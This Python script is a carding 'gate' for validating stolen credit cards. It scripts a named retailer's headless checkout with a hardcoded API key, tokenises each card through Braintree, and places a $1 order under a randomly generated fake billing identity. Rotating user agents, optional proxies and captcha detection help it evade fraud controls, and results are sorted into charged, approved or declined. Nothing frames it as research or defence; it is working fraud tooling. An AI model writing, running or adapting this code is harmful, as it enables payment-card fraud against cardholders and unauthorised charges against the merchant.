"""Braintree $1 gate — vitabase.com headless checkout."""
from __future__ import annotations

import base64
import json
import random
import re
import string
import time
import uuid

import requests

from helpers import classify_gate_response

HTTP_TIMEOUT = (10, 25)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

PRODUCT_ID = 3298960
API_KEY = "d8761e2127e9a3342797abf0558b3569bb35d3f8836b9c80485ba250ee3aa744"

FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard",
    "Joseph", "Thomas", "Charles", "Emily", "Emma", "Olivia", "Ava",
]
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
    "Davis", "Wilson", "Taylor", "Anderson", "Thomas", "Jackson", "White",
]
STREETS = [
    "Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine Rd", "Elm St",
]
CITIES_STATES = [
    ("Phoenix", "AZ", "850"),
    ("Los Angeles", "CA", "900"),
    ("Houston", "TX", "770"),
    ("Chicago", "IL", "606"),
    ("Dallas", "TX", "752"),
]


def _clean_msg(msg: str, limit: int = 120) -> str:
    s = re.sub(r"<[^>]+>", " ", str(msg or ""))
    s = re.sub(r"\s+", " ", s).strip()
    if "{" in s:
        s = s.split("{", 1)[0].strip()
    return (s[:limit] if s else "Declined")


def _rand_billing() -> tuple[dict, dict]:
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    email = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
    address = f"{random.randint(100, 99999)} {random.choice(STREETS)}"
    city, state, zip_prefix = random.choice(CITIES_STATES)
    postcode = zip_prefix + str(random.randint(10, 99))
    phone = "+1" + "".join(random.choices(string.digits, k=10))
    billing = {
        "first_name": first,
        "last_name": last,
        "company": "",
        "address_1": address,
        "address_2": "",
        "city": city,
        "state": state,
        "postcode": postcode,
        "country": "US",
        "email": email,
        "phone": phone,
    }
    shipping = {k: v for k, v in billing.items() if k not in ("email", "phone")}
    return billing, shipping


def _classify_checkout(result: dict | None, http_status: int) -> tuple[str, str, str]:
    if http_status >= 500:
        return "error", f"upstream_{http_status}", "upstream_5xx"
    if not isinstance(result, dict):
        return "declined", "invalid_checkout_response", "declined"

    if result.get("error") == "timeout":
        return "error", "checkout_timeout", "timeout"

    order = result.get("order") if isinstance(result.get("order"), dict) else {}
    hint = ""
    if (
        result.get("success") is True
        or result.get("status") in ("success", "completed", "processing", "paid")
        or result.get("order_id")
        or order.get("id")
        or result.get("payment_status") in ("paid", "completed", "success")
    ):
        oid = str(result.get("order_id") or order.get("id") or "")
        hint = f"order success payment successful charged {oid}"

    err = result.get("error")
    if isinstance(err, dict):
        err_text = str(err.get("message") or err.get("description") or err.get("code") or "")
    else:
        err_text = str(err or "")

    blob = json.dumps(result, default=str)
    text = f"{hint} {err_text} {result.get('message', '')} {result.get('msg', '')} {blob}"
    status, msg, code = classify_gate_response(text, status_hint="charged" if hint else "", code_hint="")

    if any(k in text.lower() for k in ("captcha", "recaptcha")):
        return "error", _clean_msg(msg or "captcha"), "captcha_required"

    if status == "charged":
        oid = str(result.get("order_id") or order.get("id") or "")
        display = f"Charged $1 ({oid})" if oid else (msg or "Charged $1")
        return "charged", _clean_msg(display), "charged"
    return status, _clean_msg(msg), code


def check_card(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
) -> tuple[str, str, str]:
    """
    Returns (status, message, code).
    status: charged | approved | declined | error
    """
    started = time.perf_counter()
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    mm = mm.zfill(2)

    user_agent = random.choice(USER_AGENTS)
    session = requests.Session()
    session.trust_env = False
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}

    billing, shipping = _rand_billing()

    try:
        session.headers.update({
            "user-agent": user_agent,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
        })
        r1 = session.get("https://vitabase.com/product/digestive-enzyme", timeout=HTTP_TIMEOUT)
        if r1.status_code != 200:
            return "error", f"init_http_{r1.status_code}", "connection_error"

        api_headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://vitabase.com",
            "referer": "https://vitabase.com/product/digestive-enzyme",
            "user-agent": user_agent,
            "x-api-key": API_KEY,
        }
        create_resp = session.post(
            "https://vitabase.com/headless-api/cart/create",
            headers=api_headers,
            json={"user_id": "guest"},
            timeout=HTTP_TIMEOUT,
        )
        create_data = create_resp.json() if create_resp.text else {}
        cart_token = create_data.get("cart_token") or (create_data.get("data") or {}).get("cart_token")
        if not cart_token:
            return "error", "no_cart_token", "cart_fail"

        add_resp = session.post(
            "https://vitabase.com/headless-api/cart/add",
            headers=api_headers,
            json={
                "cart_token": cart_token,
                "product_id": PRODUCT_ID,
                "quantity": 1,
                "user_id": "guest",
                "autoship_flag": False,
            },
            timeout=HTTP_TIMEOUT,
        )
        if add_resp.status_code not in (200, 201):
            return "error", f"cart_add_{add_resp.status_code}", "cart_fail"

        bt_resp = session.get(
            "https://vitabase.com/headless-api/braintree/client-token",
            headers=api_headers,
            timeout=HTTP_TIMEOUT,
        )
        if bt_resp.status_code != 200:
            return "error", f"bt_token_{bt_resp.status_code}", "connection_error"
        bt_data = bt_resp.json()
        client_token = bt_data.get("client_token")
        if not client_token:
            return "error", "no_braintree_token", "bt_token_fail"
        if bt_data.get("require_captcha"):
            return "error", "recaptcha_required", "captcha_required"

        try:
            decoded = json.loads(base64.b64decode(client_token))
            auth_fingerprint = decoded.get("authorizationFingerprint")
        except Exception as e:
            return "error", f"bt_decode_fail: {e}", "bt_token_fail"
        if not auth_fingerprint:
            return "error", "no_auth_fingerprint", "bt_token_fail"

        gql_headers = {
            "accept": "*/*",
            "authorization": f"Bearer {auth_fingerprint}",
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
            "user-agent": user_agent,
        }
        gql_payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": str(uuid.uuid4()),
            },
            "query": (
                "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
                "{ tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"
            ),
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvv,
                    },
                    "options": {"validate": False},
                },
            },
            "operationName": "TokenizeCreditCard",
        }
        gql_resp = session.post(
            "https://payments.braintree-api.com/graphql",
            headers=gql_headers,
            json=gql_payload,
            timeout=HTTP_TIMEOUT,
        )
        gql_json = gql_resp.json() if gql_resp.text else {}
        payment_nonce = (gql_json.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
        if not payment_nonce:
            err_blob = json.dumps(gql_json, default=str)
            st, msg, code = classify_gate_response(err_blob)
            return st, _clean_msg(msg or "tokenize failed"), code

        checkout_headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://checkout.vitabase.com",
            "referer": "https://checkout.vitabase.com/",
            "user-agent": user_agent,
            "x-api-key": API_KEY,
        }
        checkout_payload = {
            "cart_token": cart_token,
            "payment_method": "braintree_cc",
            "shipping_method": "free_shipping",
            "shipping_method_id": "free_shipping",
            "shipping_method_title": "Free Shipping",
            "shipping_total": "0",
            "billing": billing,
            "shipping": shipping,
            "ship_to_different_address": 0,
            "line_items": [{"product_id": PRODUCT_ID, "quantity": 1, "autoship_flag": False}],
            "payment_nonce": payment_nonce,
        }
        co_resp = session.post(
            "https://vitabase.com/headless-api/checkout",
            headers=checkout_headers,
            json=checkout_payload,
            timeout=(10, 45),
        )
        try:
            co_json = co_resp.json() if co_resp.text else {}
        except json.JSONDecodeError:
            co_json = {"message": (co_resp.text or "")[:200]}

        status, msg, code = _classify_checkout(co_json, co_resp.status_code)
        elapsed = f"{time.perf_counter() - started:.2f}s"
        return status, f"{msg} ({elapsed})", code

    except requests.Timeout:
        return "error", "timeout", "timeout"
    except requests.RequestException as e:
        low = str(e).lower()
        if "proxy" in low or "tunnel" in low or "connect" in low:
            return "error", str(e)[:120], "proxy_error"
        return "error", str(e)[:120], "connection_error"
    except Exception as e:
        return "error", str(e)[:120], "exception"


def check_card_str(cc_str: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    parts = cc_str.replace("/", "|").split("|")
    if len(parts) < 4:
        return "error", "invalid_cc_format", "bad_format"
    return check_card(parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip(), proxy_url)


if __name__ == "__main__":
    import sys

    raw = sys.argv[1] if len(sys.argv) > 1 else input("CC|MM|YY|CVV: ").strip()
    px = sys.argv[2] if len(sys.argv) > 2 else None
    st, msg, code = check_card_str(raw, px)
    print(st, code, msg)
